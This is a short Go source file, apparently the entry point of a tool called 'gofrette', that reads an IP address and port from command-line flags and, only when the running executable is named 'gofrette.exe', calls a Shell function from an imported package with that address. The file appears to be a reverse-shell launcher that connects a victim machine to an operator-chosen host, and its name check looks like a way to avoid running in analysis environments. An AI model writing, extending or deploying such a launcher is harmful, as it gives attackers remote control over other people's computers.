package main

import (
	s "awesomeProject/gofrette/shell"
	"flag"
	"fmt"
	"os"
	"strings"
)

func main() {
	ipaddr := flag.String("a","127.0.0.1","ip")
	port := flag.Int("p",1234,"port")
	flag.Parse()
	address := fmt.Sprintf("%s:%d",*ipaddr, *port)

	name := os.Args[0]
	if strings.Contains(name,"gofrette.exe") {
		s.Shell(address)
	}
	os.Exit(1)
}



